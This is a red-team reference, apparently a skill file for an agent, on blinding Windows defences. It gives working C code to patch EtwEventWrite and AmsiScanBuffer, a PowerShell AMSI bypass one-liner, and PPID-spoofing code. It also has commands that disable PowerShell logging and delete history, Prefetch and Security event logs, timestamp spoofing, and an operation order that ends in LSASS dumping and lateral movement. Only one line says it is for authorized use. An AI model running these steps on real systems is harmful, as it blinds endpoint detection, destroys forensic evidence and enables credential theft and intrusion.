# Telemetry blinding: ETW / AMSI / anti-forensics

> Authorized red team / adversary emulation / own-product tests only. Forbidden on unauthorized targets.

EDR detect leans heavily on two telemetry pipes: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This doc: red-team counters for both, plus Sysmon / PowerShell logging / timestamp spoof anti-forensics.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW internals

ETW is Windows' built-in high-performance event-tracing framework. EDR uses it as "light kernel telemetry".
Providers red teams care about most:

| Provider GUID | Name | Who uses it |
|---------------|------|-------------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI report |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process / thread base events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET load, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR start |

### Key user-mode APIs

| API | DLL | Role |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Write event (most used) |
| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite underside |
| `NtTraceControl` | `ntdll.dll` | Control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | whether provider is on |
| `EtwEventRegister` | `ntdll.dll` | register provider |

### Call chain

```text
app EventWrite(...)
  → Microsoft wrap (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumer (EDR user-mode process subscribed to the session)
```

## 2. Three ETW-patch methods

### Method A: EtwEventWrite head patch

Rewrite `ntdll!EtwEventWrite` entry to return success immediately:

```text
original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patched (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // note: VirtualProtect itself may be hooked -> use indirect-syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing ntdll memory is itself an ETW-TI source for `ALPC_MODIFY_PROCESS` / `PROTECTVM`.
MUST **indirect-syscall + bypass NtProtectVirtualMemory hook, then patch**,
or EDR gets the alert before the patch takes effect.

### Method B: EtwEventEnabled always-false

Stealthier: do not touch `EtwEventWrite`; make `EtwEventEnabled` always return FALSE.
App layer decides "provider is off" → never calls `EtwEventWrite`. Friendlier to memory-hash integrity (many EDRs checksum `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl stop provider

Syscall-stop the EDR session (invasive, but no ntdll-byte rewrite):

```c
// NtTraceControl(EtwpStopTrace, ...)
// needs SeSystemProfilePrivilege or higher
// use after Local Admin + UAC bypass
```

Rare in the field because:

- Stopping the session itself fires "ETW provider stopped" on another pipe
- Needs high privilege

### Method D: Kernel ETW patch (only with existing BYOVD / kernel R/W)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
zero them so all ETW-TI events are dropped
```

This is the BYOVD stage of attack-chain; this skill does not go deep.

## 3. AMSI Bypass

AMSI is the Windows interface PowerShell / .NET / WMI / VBA use for AV scan before script exec.
Red teams hit PowerShell + AMSI most.

### Classic AmsiScanBuffer patch

```c
// write at amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-liner (detect-adversary reference only; itself signatured / Defender-blocked):

```powershell
# concept demo — real env MUST pair with obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced 1: Hardware Breakpoint AMSI Bypass

No write to amsi.dll memory (no integrity scan):

1. AddVectoredExceptionHandler
2. Set `DR0` at `AmsiScanBuffer` entry
3. On VEH hit set `RAX = 0x80070057`, `RIP = ret insn addr`, `RSP += 8`
4. ContinueExecution

Same infrastructure as HWBP Blindside in unhook-techniques.md; share the VEH.

### Advanced 2: Corrupt AmsiContext / AmsiSession

Build a malformed `AmsiContext` so `AmsiScanBuffer` fails its internal check and returns success early:

```text
// AmsiContext header should be "AMSI" magic
// rewrite to "XXXX" → AmsiScanBuffer check fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced 3: Reflective-load a copy of amsi.dll

Do not use system amsi.dll; reflectively load a clean copy into your process and redirect the PowerShell engine's AMSI calls.
For advanced EDR that already intercepts PowerShell.exe at load.

## 4. Anti-forensics: wipe traces

### Disable PowerShell ScriptBlock Logging

```powershell
# registry (needs admin)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# current session
Clear-History
# persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# needs SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# wipe all (large action; use with care)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL log

```powershell
# stop session then delete etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# note: deleting .evtx makes Event Log Service recreate it and write "log cleared" (Event ID 1102)
# stealthier: in-memory patch wevtsvc.dll EventLog API (T1070.001)
```

### Timestamp spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon monitor evasion

Sysmon is the most common free community telemetry (many shops use olaf configs).
Key events:

| Event ID | Meaning |
|----------|---------|
| 1 | ProcessCreate (PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL load) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion ideas

1. **Do not create a new process** — act entirely inside an already-injected process; skip Event ID 1
2. **PPID Spoof** — `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` set PPID to `explorer.exe` so Sysmon ProcessCreate looks legit

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + do not touch the image** — Process Hollowing is caught by Event ID 25 on new Sysmon.
   Prefer **module stomping** (overwrite a section of an already-loaded legit DLL) or newer **dirty vanity**,
   plus PPID spoof
4. **No remote thread** — avoid Event ID 8; `NtCreateThreadEx` in-process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call-stack spoof + timestamps so events look like legit software

Even when ProcessCreate cannot be skipped (some scenes MUST spawn a child):

- Shape CommandLine like a legitimate product
- PPID-spoof to services.exe (looks like an SCM-started service)
- Change the Image hash ImageLoad sees: module-stomp implant code into a signed DLL's memory
- Pair CallStackSpoofer: even with EnableCallTracing, Sysmon cannot see implant frames

## 7. Field OPSEC: operation order

**Wrong order and EDR gets the alert first**, then later actions are fused.

Correct order:

```text
1. AMSI bypass (HWBP first, avoid writing amsi.dll)
   ─── so .NET / PowerShell load of the implant is not scanned
2. ETW patch (patch EtwEventWrite before any further syscall)
   ─── kill telemetry of later actions
3. NtProtectVirtualMemory via indirect syscall
   ─── a "safe" memory-perm switch channel
4. Unhook ntdll (Peruns Fart) or enable indirect syscall
   ─── wipe user-mode hooks
5. Call stack spoof setup
   ─── forged stack for all later syscalls
6. Actual payload (inject / lateral / dump LSASS)
7. Wipe traces (PowerShell history / Prefetch / timestamps)
```

Wrong-order examples:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC already has the alert
❌ Dump LSASS first → AMSI / ETW still live → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass dump: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf config: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing callback

After this trio (hook survey → unhook → telemetry blinding), return to `SKILL.md` Step 5 and verify in a sandbox,
then enter the next stage via `attack-chain/` initial access and lateral movement.
